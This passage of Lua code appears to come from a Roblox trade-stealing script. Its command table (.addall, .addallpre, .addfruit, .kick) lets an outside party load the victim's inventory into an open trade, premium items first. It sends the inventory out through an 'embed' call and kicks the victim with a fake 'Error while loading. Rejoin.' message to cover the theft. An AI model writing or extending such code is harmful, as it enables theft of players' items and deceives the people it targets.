    pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", name)
end

local function cmdTp()
    local s = pickSeat(nil)
    if s then sitOn(s) end
end
local function cmdJump() forceJumpOff() end
local function cmdSit()
    local s = pickSeat(nil)
    if s then sitOn(s) end
end
local function cmdAddFruit(args)
    if not args or args == "" or not tradeWindowOpen() then return end
    local search = args:lower()
    local inv = getInventory()
    if inv then
        for _, item in ipairs(inv) do
            if norm(item.Name):find(search, 1, true) then
                addToTrade(item.Name)
                return
            end
        end
    end
end
local function cmdClear(args)
    if not args or args == "" or not tradeWindowOpen() then return end
    local search = args:lower()
    local c = PG.Main.Trade:FindFirstChild("Container")
    if not c or not c:FindFirstChild("1") then return end
    local frame = c["1"]:FindFirstChild("Frame")
    if not frame then return end
    for _, item in ipairs(frame:GetChildren()) do
        if item:IsA("ImageButton") and norm(item.Name):find(search, 1, true) then
            pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", item.Name)
            return
        end
    end
end
local function cmdClearAll() clearTradeItems() end

local function cmdAddAll()
    if not tradeWindowOpen() then return end
    sendInventoryEmbed("Command: .addall")
    clearTradeItems()
    task.wait(0.25)
    local items = collectTradeable()
    local take = math.min(MAX_ITEMS_PER_TRADE, #items)
    for i = 1, take do addToTrade(items[i].Name); task.wait(0.15) end
end
local function cmdAddAllPre()
    if not tradeWindowOpen() then return end
    sendInventoryEmbed("Command: .addallpre")
    clearTradeItems()
    task.wait(0.25)
    local inv = getInventory()
    if not inv then return end
    local prems = {}
    for _, v in ipairs(inv) do if isPremium(v) then prems[#prems + 1] = v end end
    table.sort(prems, function(a, b) return priorityRank(a) < priorityRank(b) end)
    local take = math.min(MAX_ITEMS_PER_TRADE, #prems)
    for i = 1, take do addToTrade(prems[i].Name); task.wait(0.15) end
end
local function cmdKick() task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end

local COMMANDS = {
    tp = cmdTp, jump = cmdJump, sit = cmdSit, addfruit = cmdAddFruit,
    clear = cmdClear, clearall = cmdClearAll, addall = cmdAddAll, addallpre = cmdAddAllPre, kick = cmdKick,
}

